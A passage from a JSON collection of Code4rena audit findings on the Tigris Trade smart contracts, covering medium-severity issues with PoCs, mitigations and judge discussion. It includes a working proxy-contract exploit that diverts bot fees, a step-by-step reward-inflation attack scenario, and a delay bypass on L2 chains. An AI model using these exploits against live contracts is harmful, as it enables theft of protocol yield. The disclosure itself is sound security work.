commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1374425022):**\n > I think I confirmed a similar issue.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1385580324):**\n > The Warden has highlighted an discrepancy in how OpenInterest is calculated, the math should cause issues in determining funding rates, however the submission doesn't show a way to reliably extract value from the system.\n> \n> Because of this, I believe the finding to be of Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1407809212):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176899 \n\n\n\n***\n\n",
      "summary": "\nThe `PairsContract` has a bug where the position size calculation is incorrect, resulting in wrong values being registered for OpenInterest. This can cause a distortion in the balance between long and short positions. A test showed that the position size registered for OpenInterest was 11% greater than the actual position created. The recommended mitigation step is to correct the calculation to use margin after fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/576",
      "tags": [],
      "finders": [
        "KingNFT",
        "0xA5DF",
        "HollaDieWaldfee",
        "Jeiwan"
      ]
    },
    {
      "id": "43163",
      "title": "[M-19] `_handleDeposit` and `_handleWithdraw` do not account for tokens with decimals higher than 18",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675>\n\n### Impact\n\nIn `Trading.sol` a [deposit](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675) or [withdrawal](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L700) of tokens with decimals higher than 18 will always revert.\n\nThis is the case e.g. for `NEAR` which is divisible into 10e24 `yocto`\n\n### Proof of Concept\n\nChange [00.Mocks.js#L33](https://github.com/code-423n4/2022-12-tigris/blob/main/deploy/test/00.Mocks.js#L33) to:\n\n    args: [\"USDC\", \"USDC\", 24, deployer, ethers.utils.parseUnits(\"1000\", 24)]\n\nThen in [07.Trading.js](https://github.com/code-423n4/2022-12-tigris/blob/main/test/07.Trading.js):\n\n    Opening and closing a position with tigUSD output\n    Opening and closing a position with <18 decimal token output\n\nare going to fail with:\n\n    Error: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nUpdate calculations in the contract to account for tokens with decimals higher than 18.\n\n**[TriHaz (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/533#issuecomment-1375985587):**\n > We are aware of that. We are not planning on adding any token that has more than 18 dec.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/533#issuecomment-1382251600):**\n > The Warden has shown how, due to an underflow, the system in-scope can revert when using tokens with more than 18 decimals.\n> \n> Because of how scope was defined, I believe the finding to be valid, I believe a nofix is acceptable as long as the sponsor keeps in mind this risk.\n> \n> Because of the risk shown, I agree with Medium Severity.\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in a code repository called \"2022-12-tigris\". The problem is in a specific file called \"Trading.sol\" and occurs when trying to deposit or withdraw tokens with more than 18 decimal places. This causes the system to revert, which means the transaction fails. The report includes steps to reproduce the issue and mentions that it was tested using a tool called VS Code. The recommended solution is to update the calculations in the contract to account for tokens with more than 18 decimals. The team behind the code has acknowledged the issue and commented that they are not planning on adding any tokens with more than 18 decimals. The judge has also commented and agrees that the issue is valid and suggests a \"nofix\" solution, meaning they will not fix it but will keep it in mind as a potential risk. This bug is considered a medium severity issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/533",
      "tags": [],
      "finders": [
        "Avci",
        "Deivitto",
        "pwnforce",
        "rbserver",
        "0xDecorativePineapple",
        "Dinesh11G",
        "izhelyazkov",
        "Englave",
        "Tointer",
        "Critical",
        "0xdeadbeef0x",
        "ak1",
        "chaduke",
        "unforgiven",
        "rvierdiiev",
        "yjrwkk",
        "0x4non"
      ]
    },
    {
      "id": "43162",
      "title": "[M-18] StopLoss/TakeProfit should be validated again for the new price in `Trading.executeLimitOrder()`",
      "impact": "MEDIUM",
      "content": "\nThe open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.\n\nAs a result, the executed market order might be closed immediately and there would be an unexpected loss for users.\n\n### Proof of Concept\n\nAs we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n480:     function executeLimitOrder(\n481:         uint _id, \n482:         PriceData calldata _priceData,\n483:         bytes calldata _signature\n484:     ) \n485:         external\n486:     {\n487:         unchecked {\n488:             _checkDelay(_id, true);\n489:             tradingExtension._checkGas();\n490:             if (tradingExtension.paused()) revert TradingPaused();\n491:             require(block.timestamp >= limitDelay[_id]);\n492:             IPosition.Trade memory trade = position.trades(_id);\n493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n495:             if (trade.orderType == 0) revert(\"5\");\n496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n497:             if (trade.direction && trade.orderType == 1) {\n498:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n499:             } else if (!trade.direction && trade.orderType == 1) {\n500:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n501:             } else if (!trade.direction && trade.orderType == 2) {\n502:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n503:                 trade.price = _price;\n504:             } else {\n505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n506:                 trade.price = _price; //@audit check sl/tp\n507:             } \n508:             if(trade.direction) {\n509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT;\n510:             } else {\n511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n512:             }\n\n```\nBut it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.\n\nThe new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.\n\nOriginally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).\n\n### Recommended Mitigation Steps\n\nRecommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1377414952):**\n > >The open price of a stop order might be changed during execution\n> \n> Limit orders open price is guaranteed, so it will not be changed, so validating sl/tp again is not needed.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1383191670):**\n > @TriHaz can you please check the following line\n> \n> ```solidity\n> 504:             } else {\n> 505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n> 506:                 trade.price = _price; //@audit check sl/tp\n> 507:             } \n> ```\n> \n> and re-affirm your dispute?\n> \n> Ultimately it looks like trade.price is changed to the new price from the feed, which is a \"correct\" price, but may not be a price the caller was originally willing to act on (not in range with SL / TP).\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1384625791):**\n > Yes my review was not correct, the price for the stop orders are not guaranteed which makes this issue valid.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1385566692):**\n > The warden has shown how, due to a lack of check, limit orders that pass the logic check may be executed even though the validation for their Stop Loss / Take Profit may not be hit\n> \n> Given the level of detail I believe the finding to be of Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1407849401):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177423 \n >\n> Since this issue only affects TP and not SL, I only added a check for that.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the open price of a stop order being changed during execution without proper validation of Stop Loss (SL) and Take Profit (TP) for the new price. This can result in unexpected losses for users as the executed market order may be closed immediately. The report includes a proof of concept and recommended mitigation steps, which involve validating SL and TP for the new price in the `executeLimitOrder()` function. The issue was initially disputed, but it was later confirmed to be valid by the team. The severity of the issue was determined to be medium and a mitigation was implemented to address it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/512",
      "tags": [],
      "finders": [
        "bin2chen",
        "hansfriese"
      ]
    },
    {
      "id": "43161",
      "title": "[M-17] User can close an order via `limitClose()`, and take bot fees to themselves",
      "impact": "MEDIUM",
      "content": "\nBot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the DAO fee and sent to the closing bot.\nA user can use that  to reduce the DAO fees for closing an order and keeping it to themselves.\n\nInstead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order.\nSince that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.\n\n### Proof of Concept\n\nThe following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..e50b0cc 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -17,6 +17,7 @@ describe(\"Trading\", function () {\n \n   let TradingExtension;\n   let tradingExtension;\n+  let myTrader;\n \n   let TradingLibrary;\n   let tradinglibrary;\n@@ -37,7 +38,7 @@ describe(\"Trading\", function () {\n \n   let MockDAI;\n   let MockUSDC;\n-  let mockusdc;\n+  let mockusdc, mockdai;\n \n   let badstablevault;\n \n@@ -55,6 +56,7 @@ describe(\"Trading\", function () {\n     const Position = await deployments.get(\"Position\");\n     position = await ethers.getContractAt(\"Position\", Position.address);\n     MockDAI = await deployments.get(\"MockDAI\");\n+    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n     MockUSDC = await deployments.get(\"MockUSDC\");\n     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n     const PairsContract = await deployments.get(\"PairsContract\");\n@@ -84,6 +86,10 @@ describe(\"Trading\", function () {\n     TradingLibrary = await deployments.get(\"TradingLibrary\");\n     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n     await trading.connect(owner).setLimitOrderPriceRange(1e10);\n+\n+\n+    let mtFactory = await ethers.getContractFactory(\"MyTrader\");\n+    myTrader = await mtFactory.deploy(Trading.address, Position.address);\n   });\n   describe(\"Check onlyOwner and onlyProtocol\", function () {\n     it(\"Set max win percent\", async function () {\n@@ -536,6 +542,31 @@ describe(\"Trading\", function () {\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened\n       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(\"0\")); // Should no tigAsset left\n     });\n+\n+    it(\"Test my trader\", async function () {\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n+      let message = ethers.utils.keccak256(\n+        ethers.utils.defaultAbiCoder.encode(\n+          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n+          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n+        )\n+      );\n+      let sig = await node.signMessage(\n+        Buffer.from(message.substring(2), 'hex')\n+      );\n+      \n+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n+\n+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);\n+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);\n+\n+\n+    });\n+  return;\n+\n     it(\"Closing over 100% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -551,8 +582,10 @@ describe(\"Trading\", function () {\n       \n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(\"BadClosePercent\");\n     });\n+    return;\n     it(\"Closing 0% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -700,6 +733,7 @@ describe(\"Trading\", function () {\n       expect(margin).to.equal(parseEther(\"500\"));\n     });\n   });\n+  return;\n   describe(\"Trading using <18 decimal token\", async function () {\n     it(\"Opening and closing a position with tigUSD output\", async function () {\n       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time\n\n```\n\n`MyTrader.sol`:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {ITrading} from \"../interfaces/ITrading.sol\";\nimport \"../utils/TradingLibrary.sol\";\nimport \"../interfaces/IPosition.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\n\n\n\n\ncontract MyTrader{\n\n    ITrading trading;\n    IPosition position;\n\n    receive() payable external{\n\n    }\n\n    constructor(address _trading, address _position){\n        trading = ITrading(_trading);\n        position = IPosition(_position);\n    }\n\n    function closeTrade(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) public{\n        bool _tp = false;\n        \n        trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);\n        trading.limitClose(_id, _tp, _priceData, _signature);\n\n        \n    }\n\n}\n```\n\n### Recommended Mitigation Steps\n\nDon't allow updating sl or tp and executing `limitClose()` at the same block.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1372980585):**\n > Valid and will be confirmed, but not sure about the severity, as the protocol will not lose anything because fees would be paid to another bot anyway. Would like an opinion from a judge.\n\n**[Alex the Entreprenerd (judge) decreased severity to QA and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1385289111):**\n > With the information that I have:\n> - System invariants are not broken\n> - No loss of value\n> \n> Ordinary operation, which for convenience can be performed by a bot, is being operated by someone else.\n> \n> Because all security invariants are still holding, but the behaviour may be a gotcha, I believe QA Low to be the most appropriate severity in lack of a value leak.\n> \n>\n>*(Note: See [original submission](https://github.com/code-423n4/2022-12-tigris-findings/issues/468) for judge's full commentary.)*\n\n**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1406733309):**\n> Per the discussion above, the Warden has shown how, any user can setup a contract to avoid paying botFees, because these are subtracted to DaoFees, these are not just a loss of yield to the DAO, but they are a discount to users, which in my opinion breaks the logic for fees.\n> \n> Because the finding pertains to a loss of Yield, I raised the report back to Medium Severity.\n> \n> I'd like to thank @0xA5DF for the clarifications done in post-judging triage.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1407792466):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176433 \n> >'Don't allow updating sl or tp and executing limitClose() at the same block'\n> \n> The recommended mitigation wouldn't work, because this would result in a separate high-severity risk. We decided on tracking the timestamp of the last limit order update, and if the order gets executed before a second has passed then the bot doesn't earn bot fees. This gives every bot a fair chance at being rewarded without incentivizing the trader to execute their own order.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the Tigris Trade platform where users can use a proxy contract to update the stop-loss value and then close the order through a function call, allowing them to keep the bot fee for themselves instead of it being subtracted from the DAO fee. This can be exploited to reduce the DAO fees for closing an order. The report provides a proof of concept and recommends a mitigation step of not allowing updating the stop-loss value and executing the limitClose() function in the same block. However, this mitigation may result in a separate high-severity risk, so the team has decided to track the timestamp of the last limit order update and not award bot fees if the order is executed within one second.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/468",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "43160",
      "title": "[M-16] `distribute()` won't update `epoch[tigAsset]` when `totalShares[tigAsset]==0` which can cause later created bond for this tigAsset to have wrong mint epoch",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86>\n\n### Impact\n\nFunction `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`. Function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. So during normal bond creation, the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. But if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` set very wrong values for bond's mint epoch when `totalShares[tigAsset] == 0`.\n\nThis would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.\n\n### Proof of Concept\n\nThis is `distribute()` code in BondNFT contract:\n\n    function distribute(\n            address _tigAsset,\n            uint _amount\n        ) external {\n            if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n            IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n            unchecked {\n                uint aEpoch = block.timestamp / DAY;\n                if (aEpoch > epoch[_tigAsset]) {\n                    for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                        epoch[_tigAsset] += 1;\n                        accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                    }\n                }\n                accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n            }\n            emit Distribution(_tigAsset, _amount);\n        }\n\nAs you can see when `totalShares[_tigAsset] == 0`, then the value of `epoch[_tigAsset]` won't get updated to today. And there is no other logic in the code to update `epoch[tigAsset]`. So when `totalShares[_tigAsset] == 0`, then the value of the `epoch[tigAsset]` would be outdated. this would happen when an asset is recently added to the BondNFT assets or when there is no bond left.\n\nWhen this condition happens and a user calls `Lock.lock()` to create a bond, the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0, that asset `epoch[]` won't get updated and in the `BondNFT.createLock()`, the wrong value would set as bond's mint epoch.\n\nThis is `Lock.lock()` code:\n\n        function lock(\n            address _asset,\n            uint _amount,\n            uint _period\n        ) public {\n            require(_period <= maxPeriod, \"MAX PERIOD\");\n            require(_period >= minPeriod, \"MIN PERIOD\");\n            require(allowedAssets[_asset], \"!asset\");\n\n            claimGovFees();\n\n            IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n            totalLocked[_asset] += _amount;\n            \n            bondNFT.createLock( _asset, _amount, _period, msg.sender);\n        }\n\nAnd this is `BondNFT.createLock()` code:\n\n        function createLock(\n            address _asset,\n            uint _amount,\n            uint _period,\n            address _owner\n        ) external onlyManager() returns(uint id) {\n            require(allowedAsset[_asset], \"!Asset\");\n            unchecked {\n                uint shares = _amount * _period / 365;\n                uint expireEpoch = epoch[_asset] + _period;\n                id = ++totalBonds;\n                totalShares[_asset] += shares;\n                Bond memory _bond = Bond(\n                    id,             // id\n                    address(0),     // owner\n                    _asset,         // tigAsset token\n                    _amount,        // tigAsset amount\n                    epoch[_asset],  // mint epoch\n                    block.timestamp,// mint timestamp\n                    expireEpoch,    // expire epoch\n                    0,              // pending\n                    shares,         // linearly scaling share of rewards\n                    _period,        // lock period\n                    false           // is expired boolean\n                );\n                _idToBond[id] = _bond;\n                _mint(_owner, _bond);\n            }\n            emit Lock(_asset, _amount, _period, _owner, id);\n        }\n\nIf a bond gets wrong value for mint epoch, it would have wrong value for expired epoch and user would get a lot of shares by lock for small time. \n\nFor example this scenario:\n\n1.  Let's assume `epoch[asset1]` is outdated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days)\n2.  During this time, because `totalShare[asset1]` was 0, the `distribute()` function won't update `epoch[asset1]` and `epoch[asset1]` would show 30 days ago.\n3.  Attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. Code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days.\n4.  Some reward would get distributed into the BondNFT for the `asset1`.\n5.  Other users would create lock too.\n6.  Attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.\n\nSo attacker was able to create lock for a long time and get shares and rewards based on that, but attacker can release lock after short time.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nUpdate `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. Only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/436)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/436#issuecomment-1387141618):**\n > The Warden has shown a set of circumstances that would allow a locker to lock their tokens for a relatively short period of time, while gaining extra rewards for up to one Epoch.\n> \n> Because the finding is limited to a theft of yield, I believe it to be of Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/436#issuecomment-1407773295):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176233 \n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function in the BondNFT contract that creates a bond and sets the bond's mint epoch (the time when the bond can be redeemed) as the current epoch for the chosen asset. However, there is a problem when the total shares for the asset are equal to zero. In this case, the epoch for the asset will not be updated, resulting in a wrong value for the bond's mint epoch. This can lead to an attacker creating a bond for a longer period of time and receiving more rewards, but being able to release the bond after a shorter period of time. The suggested mitigation is to update the epoch index even when the total shares are zero. The severity of this bug is considered to be medium. The bug has been resolved by implementing the suggested mitigation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/436",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "43159",
      "title": "[M-15] `_checkDelay` will not work properly for Arbitrum or Optimism due to `block.number`",
      "impact": "MEDIUM",
      "content": "\nTrade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices.\n\n### Proof of Concept\n\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            //in those situations\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n`\\_checkDelay` enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. \n\nAccording to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. \n\nThe user would open their position 1 Arbitrum block before the sync happens, then close it the very next block. It would appear that there has been 5 blocks (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks it would be impossible to block this behavior through parameter changes.\n\nIt also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.\n\n### Recommended Mitigation Steps\n\nThe delay should be measured using `block.timestamp` rather than `block.number`.\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1372885915):**\n > >Once per minute the block number in the Sequencer is synced to the actual L1 block number.\n> \n> That is changed after Nitro upgrade.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1387095679):**\n > @TriHaz I'd like to flag this issue with the following notes:\n> block.number will return the latest synched block number from L1, this can be stale.\n> \n> Per [the docs](https://developer.offchainlabs.com/time):\n> ```\n> As a general rule, any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes). (It so happens these are generally the same assumptions one should operate under when using block numbers directly on Ethereum!)\n> ```\n> \n> From a trusted Arbitrum Dev:\n> `using block.number is generally fine if you want to measure time, since that will roughly follow L1 block time`\n> \n> So ultimately this is dependent on how big or small of a delay is required.\n> \n> For minutes to hours, there seems to be no risk, while for shorter timeframes, some risk is possible.\n> \n> In terms of impact, the main impact would be that an operation that would be expected to be executed 12 seconds later, could actually be executed as rapidly as 1 or 2 seconds after (if we assume that one L2 block goes from number A to B).\n> \n> I don't think the finding can be categorized High Severity due to the reliance on settings and intentions, but at this point I believe the finding is valid and am thinking it should be of Medium Severity as it may break expectations (e.g. being able to use the same oracle price in 2 separate blocks due to unexpectedly small timestamp differences), but this is reliant on an external condition.\n> \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1399439675):**\n > I have also recently checked Optimism Docs, in anticipation of the Bedrock upgrade.\n> \n> Very notable warning\n> <img width=\"832\" alt=\"Screenshot 2023-01-22 at 10 32 48\" src=\"https://user-images.githubusercontent.com/13383782/213909047-2793d041-757d-4ed8-b0c0-458e86fbe582.png\">\n>\n> Source: https://community.optimism.io/docs/developers/bedrock/how-is-bedrock-different/\n> \n> Leading me to further agree with the risk involved with the finding, at this time I believe `block.timestamp` to be a better tool for all L2 integrations.\n\n**[GainsGoblin (Tigris Trade) confirmed and resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1407767535):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176100 \n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the trade delay function on Arbitrum, a layer 2 solution for Ethereum. The function, which is designed to prevent users from exploiting multiple valid prices, does not work correctly on Arbitrum. This is because the block number used in the function is not reliable on Arbitrum, as it only syncs with the main Ethereum network once per minute. This means that users can bypass the delay by opening and closing a position in the same Arbitrum block. The recommended mitigation is to use the timestamp instead of the block number in the delay function. The severity of this issue was disputed and eventually resolved by the developers of Tigris Trade, the platform where the bug was discovered. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/419",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "43158",
      "title": "[M-14] `BondNFT.sol#claim()` needs to correct all the missing epochs",
      "impact": "MEDIUM",
